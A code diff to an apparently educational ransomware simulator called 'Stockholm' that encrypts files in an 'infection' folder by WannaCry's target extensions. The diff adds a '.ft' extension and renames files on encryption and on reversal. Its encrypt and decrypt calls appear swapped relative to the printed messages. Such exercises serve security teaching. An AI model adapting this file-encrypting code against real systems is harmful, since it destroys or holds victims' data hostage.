@@ -3,6 +3,7 @@ import argparse
 import os
 
 TARGET_DIR = "infection"
+EXT = ".ft"
 EXTENSIONS_FILE = "wannacry_file_extensions.txt"
 
 class Flags():
@@ -33,13 +34,16 @@ def handle_target(file):
 			contents = f.read()
 			if Flags.reverse:
 				result = encrypt(contents)
+				f.write(result)
+				new_filename = file[:-len(EXT)]
+				os.rename(file, new_filename)
+				print(f"decrypted: {new_filename}")
 			else:
 				result = decrypt(contents)
-			f.write(result)
-		if Flags.reverse:
-			print(f"decrypted: {file}")
-		else:
-			print(f"encrypted: {file}")
+				f.write(result)
+				new_filename = file + EXT
+				os.rename(file, new_filename)
+				print(f"encrypted: {new_filename}")
 	except Exception as e:
 		error_continue(e)
 
@@ -76,9 +80,13 @@ def check_directory():
 
 def Stockholm():
 	dir_path = check_directory()
-	exts = get_extensions()
 	files = []
-	get_targets(dir_path, files, exts)
+	if Flags.reverse:
+		get_targets(dir_path, files, [EXT])
+	else:
+		exts = get_extensions()
+		get_targets(dir_path, files, exts)
+
 	if not files:
 		error_exit(f"target files does not exist")
 
